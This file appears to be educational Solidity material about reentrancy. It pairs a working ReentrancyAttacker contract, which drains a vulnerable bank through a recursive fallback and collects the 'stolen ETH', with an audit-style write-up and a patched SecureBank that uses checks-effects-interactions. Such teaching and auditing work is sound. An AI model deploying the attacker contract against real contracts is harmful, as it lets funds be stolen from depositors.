// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Reentrancy Attacker Contract
CONCEPT: Recursive ETH drain
=========================================================

WARNING:
This is an EDUCATIONAL ATTACK DEMO ONLY.

Do NOT deploy against real contracts.
=========================================================
*/

interface IVulnerableBank {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

/*
=========================================================
ATTACK CONTRACT
=========================================================
*/

contract ReentrancyAttacker {

    IVulnerableBank public bank;
    address public owner;

    uint256 public attackAmount;
    bool public attacking;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack() external payable {
        require(msg.sender == owner, "Only owner");

        /*
            Store attack amount
        */
        attackAmount = msg.value;

        /*
            Step 1:
            Deposit ETH into vulnerable bank
        */
        bank.deposit{value: msg.value}();

        /*
            Step 2:
            Start withdrawal (triggers reentrancy)
        */
        attacking = true;
        bank.withdraw(msg.value);
        attacking = false;
    }

    /*
    =====================================================
    FALLBACK FUNCTION (REENTRANCY POINT)
    =====================================================
    */

    fallback() external payable {

        /*
        =================================================
        CRITICAL REENTRANCY LOOP
        =================================================

        This runs when bank sends ETH back.

        BEFORE bank updates balance,
        attacker re-enters withdraw().
        */

        if (attacking) {

            uint256 bankBalance =
                address(bank).balance;

            /*
                Continue attacking while bank has funds.
            */
            if (bankBalance >= attackAmount) {

                bank.withdraw(attackAmount);
            }
        }
    }

    /*
    =====================================================
    COLLECT STOLEN ETH
    =====================================================
    */

    function withdrawStolen() external {
        require(msg.sender == owner, "Only owner");

        payable(owner).transfer(address(this).balance);
    }

    /*
    =====================================================
    VIEW CONTRACT BALANCE
    =====================================================
    */

    function getBalance()
        external
        view
        returns (uint256)
    {
        return address(this).balance;
    }
}


/*
Audit Report
Title:
Reentrancy Attack via Fallback Function

Severity:
Critical

Issue:
The attacker contract uses a fallback() function to repeatedly call withdraw() on a vulnerable bank before its state is updated, enabling recursive ETH withdrawal (reentrancy).

Impact:
Drain contract funds
Multiple withdrawals in one transaction
Bypass balance restrictions
Total loss of deposited ETH in vulnerable bank

Root Cause:
External call made before state update in bank contract
No reentrancy protection (no CEI / guard)

Fix:
Follow Checks-Effects-Interactions (CEI)
Update state before external call
Use reentrancy guard
*/

//Patch Code 


contract SecureBank {

    mapping(address => uint256) public balance;

    /*
    =========================
    DEPOSIT
    =========================
    */
    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    /*
    =========================
    WITHDRAW (SECURE)
    =========================
    */
    function withdraw(uint256 amount) external {

        // STEP 1: Check
        require(balance[msg.sender] >= amount, "Insufficient balance");

        // STEP 2: Effects (state update first)
        balance[msg.sender] -= amount;

        // STEP 3: Interaction (external call last)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    /*
    =========================
    VIEW BALANCE
    =========================
    */
    function getBalance(address user) external view returns (uint256) {
        return balance[user];
    }
}